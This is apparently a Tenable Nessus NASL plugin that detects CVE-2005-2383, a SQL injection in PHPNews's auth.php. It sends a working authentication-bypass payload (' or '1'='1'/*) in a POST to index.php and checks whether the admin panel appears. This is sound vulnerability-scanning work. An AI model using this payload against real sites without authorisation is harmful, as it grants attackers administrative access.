#
# (C) Tenable Network Security
#


if (description) {
  script_id(19287);
  script_version("$Revision: 1.4 $");

  script_cve_id("CVE-2005-2383");
  script_bugtraq_id(14333);

  name["english"] = "PHPNews auth.php SQL Injection Vulnerability";
  script_name(english:name["english"]);

  desc["english"] = "
Synopsis :

The remote web server contains a PHP script that is prone to a SQL
injection attack. 

Description :

The remote host is running PHPNews, an open-source news application
written in PHP. 

The installed version of PHPNews is prone to a SQL injection attacks
because of the its failure to sanitize user-supplied input via the
'user' and 'password' parameters of the 'auth.php' script.  Provided
PHP's 'magic_quotes_gpc' setting is disabled, an attacker can exploit
this flaw to manipulate SQL queries, even to gain administrative
access. 

See also :

http://archives.neohapsis.com/archives/bugtraq/2005-07/0330.html
http://newsphp.sourceforge.net/changelog/changelog_1.30.txt

Solution:

Upgrade to PHPNews version 1.3.0 or later.

Risk factor : 

Medium / CVSS Base Score : 6
(AV:R/AC:H/Au:NR/C:P/A:P/I:P/B:N)";
  script_description(english:desc["english"]);
 
  summary["english"] = "Checks for auth.php SQL injection vulnerability in PHPNews";
  script_summary(english:summary["english"]);
 
  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2005-2006 Tenable Network Security.");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("url_func.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);


# Loop through directories.
if (thorough_tests) dirs = make_list("/phpnews", "/news", cgi_dirs());
else dirs = make_list(cgi_dirs());

foreach dir (dirs) {
  # Check whether index.php exists.
  #
  # nb: index.php require()'s auth.php, in which the flaw lies, so we
  #     can test either. The advantage of using index.php, though,
  #     is that if the exploit is successful, we should see some
  #     following text from the admin panel rather than nothing, as
  #     would be the case if we used auth.php.
  res = http_get_cache(item:string(dir, "/index.php"), port:port);
  if (res == NULL) exit(0);

  # If it does and looks like PHPNews...
  if ('<link href="phpnews_package.css"' >< res) {
    # Try to exploit the flaw to bypass authentication.
    postdata = string(
      "user=", urlencode(str:"user=nessus' or '1'='1'/*"), "&",
      "password=", SCRIPT_NAME
    );
    req = string(
      "POST ", dir, "/index.php HTTP/1.1\r\n",
      "Host: ", get_host_name(), "\r\n",
      "User-Agent: ", get_kb_item("global_settings/http_user_agent"), "\r\n",
      "Content-Type: application/x-www-form-urlencoded\r\n",
      "Content-Length: ", strlen(postdata), "\r\n",
      "\r\n",
      postdata
    );
    res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
    if (res == NULL) exit(0);

    # There's a problem if we see the admin page.
    if ('<a href="index.php?action=logout">' >< res) {
      security_warning(port);
      exit(0);
    }
  }
}
